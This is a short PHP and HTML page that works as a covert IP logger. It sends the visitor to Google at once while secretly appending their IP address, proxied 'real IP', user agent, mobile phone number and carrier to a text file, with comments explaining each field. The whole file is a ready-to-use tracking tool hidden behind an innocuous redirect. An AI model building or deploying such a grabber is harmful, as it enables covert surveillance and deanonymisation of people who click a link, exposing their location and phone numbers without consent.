<!-- 0 seconds redirect to Google homepage-->
<meta http-equiv="refresh" content="0;url=https://www.google.com/" />
<?php
//Shifting the printed date to my timezone requires adding an additional hour to the recorded time
$timezone=strtotime("+1 Hour");
//One-liner putting appended date, IP address, IP address in case of non-anonymous proxy use, user agent(Device and OS), Phone number and Carrier
//The switch at the end makes it append data instead of overwriting
file_put_contents('Info.txt', date("l d/m/Y H:i:s", $timezone)."\nIP/Proxy IP: ".$_SERVER['REMOTE_ADDR']."\nREAL IP(Proxy being used): ".$_SERVER['HTTP_X_FORWARDED_FOR']."\nDevice: ".$_SERVER['HTTP_USER_AGENT']."\nPhone No.: ".$_SERVER['HTTP_MSISDN']."\nCarrier: ".$_SERVER['HTTP_CARRIER']."\n", FILE_APPEND);
?>
